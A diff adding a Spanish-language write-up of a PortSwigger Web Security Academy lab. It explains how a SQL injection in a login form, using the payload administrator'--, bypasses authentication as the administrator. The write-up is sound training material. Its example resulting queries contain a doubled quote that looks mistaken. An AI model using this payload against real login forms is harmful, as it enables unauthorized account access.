@@ -1,0 +1,61 @@
+---
+title: "#2 - SQL injection vulnerability allowing login bypass"
+description: "Explotación de una inyección SQL en el formulario de login para eludir la autenticación e iniciar sesión como el usuario administrator."
+date: "2026-07-12"
+tags: ["portswigger", "sql-injection", "apprentice", "login-bypass"]
+category: "sql-injection"
+---
+
+Status: Completed
+Difficulty: APPRENTICE
+Main Vulnerability: SQL Injection
+Platform: Portswigger
+
+**Laboratorio:** [Lab: SQL injection vulnerability allowing login bypass | Web Security Academy](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
+
+- Objetivo:  Iniciar sesión como el usuario `administrator` mediante inyección SQL en el formulario de login.
+
+## **Análisis inicial**
+
+La aplicación presenta un formulario de inicio de sesión con campos `username` y `password`. Al enviar las credenciales, se ejecuta una consulta SQL en el servidor que verifica si existe un usuario con ese nombre y contraseña.
+
+## Consulta original:
+
+```sql
+SELECT * FROM users WHERE username = 'administrator' AND password = ''
+```
+
+## Solución
+
+- **Vulnerabilidad**:
+    
+    Si el parámetro `username` es vulnerable a inyección SQL, se puede manipular para:
+    
+    - Finalizar prematuramente la cadena.
+    - Omitir la condición de contraseña (`AND password = ''`).
+    - Comentar el resto de la consulta con `-`.
+
+- **Payload inyectado:**
+    
+    Opción 1 (suficiente en este laboratorio):
+    
+    ```sql
+    administrator'--
+    ```
+    
+    Consulta resultante:
+    
+    ```sql
+    SELECT * FROM users WHERE username = 'administrator''-- AND password = ''
+    //------------------------------------------------------------------------------//
+    SELECT * FROM users WHERE username = 'administrator'' OR 1=1-- AND password = ''
+    ```
+    
+    El comentario `--` ignora el resto de la consulta (`AND password = ''`), permitiendo el acceso sin necesidad de conocer la contraseña.
+    
+
+## ✅ Resultado
+
+La inyección permite iniciar sesión directamente como el usuario `administrator`, resolviendo el laboratorio con éxito.
+
+![Resultado del laboratorio resuelto tras iniciar sesión como administrator](/writeups/portswigger/2_sql_injection_login_bypass/image.png)
